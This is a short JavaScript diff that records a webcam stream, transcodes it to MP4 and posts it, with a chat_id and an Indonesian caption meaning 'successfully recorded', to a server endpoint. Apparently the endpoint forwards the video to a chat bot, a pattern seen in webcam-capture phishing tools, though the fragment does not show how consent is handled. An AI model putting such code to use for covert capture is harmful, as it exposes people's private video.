@@ -69,24 +69,25 @@ if (!isPhotoMode) {
 
       recorder = new MediaRecorder(stream);
       recorder.ondataavailable = e => chunks.push(e.data);
-
       recorder.onstop = async () => {
-  const webmBlob = new Blob(chunks, { type: 'video/webm' });
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const mp4Blob = await transcodeWebMtoMP4(blob); // Transcode ke mp4
 
-  const mp4Blob = await transcodeWebMtoMP4(webmBlob); // Transcode ke mp4
+        const form = new FormData();
+        form.append("chat_id", uid);
+        form.append("video", mp4Blob, "webcam.mp4");
 
-  const form = new FormData();
-  form.append("chat_id", uid);
-  form.append("video", mp4Blob, "webcam.mp4");
 
-  const timestamp = new Date().toLocaleTimeString();
-  form.append("caption", `Berhasil merekam\n${timestamp}`);
+        const timestamp = new Date().toLocaleTimeString();
+        form.append("caption", `Berhasil merekam\n${timestamp}`);
+        
+        fetch(`/api/send-video`, {
+            method: "POST",
+            body: form
+        });
 
-  await fetch('/api/send-video', {
-    method: 'POST',
-    body: form
-  });
-};
+
+      };
 
 
       recorder.start();
